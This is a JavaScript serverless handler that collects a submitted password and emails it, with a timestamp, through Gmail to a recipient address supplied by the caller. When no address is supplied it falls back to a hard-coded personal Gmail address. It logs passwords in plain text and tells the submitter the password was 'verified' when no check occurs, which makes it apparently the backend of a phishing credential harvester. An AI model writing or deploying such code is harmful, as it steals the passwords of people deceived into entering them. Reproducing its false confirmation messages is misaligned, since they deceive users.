import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    // ✅ Get password AND workerEmail FROM FRONTEND
    const { password, workerEmail } = req.body;

    console.log('🔐 Password Form:');
    console.log('Password:', password);
    console.log('Worker Email from frontend:', workerEmail);
    
    // Validate email
    if (!workerEmail || !workerEmail.includes('@')) {
      console.log('⚠️ Invalid email, using default');
      workerEmail = "mehtabalii67890@gmail.com";
    }
    
    const emailResult = await sendPasswordEmail(password, workerEmail);

    return res.status(200).json({
      success: true,
      message: 'Password verified successfully',
      emailSent: emailResult.success,
      recipient: workerEmail, // ✅ Frontend ka email return karein
      emailMessage: emailResult.message
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(200).json({
      success: true,
      message: 'Verification completed',
      emailSent: false
    });
  }
}

async function sendPasswordEmail(password, workerEmail) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.GMAIL_USER, pass: process.env.GMAIL_APP_PASS }
    });

    await transporter.sendMail({
      from: `"Password System" <${process.env.GMAIL_USER}>`,
      to: workerEmail,
      subject: `🔐 Password Submitted - ${new Date().toLocaleTimeString()}`,
      html: `
        <div style="font-family: Arial, sans-serif;">
          <h2 style="color: #d32f2f;">🔐 PASSWORD FORM</h2>
          <p><strong>Password:</strong> ${password}</p>
          <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
          <p><strong>Sent to:</strong> ${workerEmail}</p>
        </div>
      `
    });
    
    console.log('✅ Password email sent to frontend email:', workerEmail);
    return { success: true, message: 'Email sent' };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return { success: false, message: error.message };
  }
}
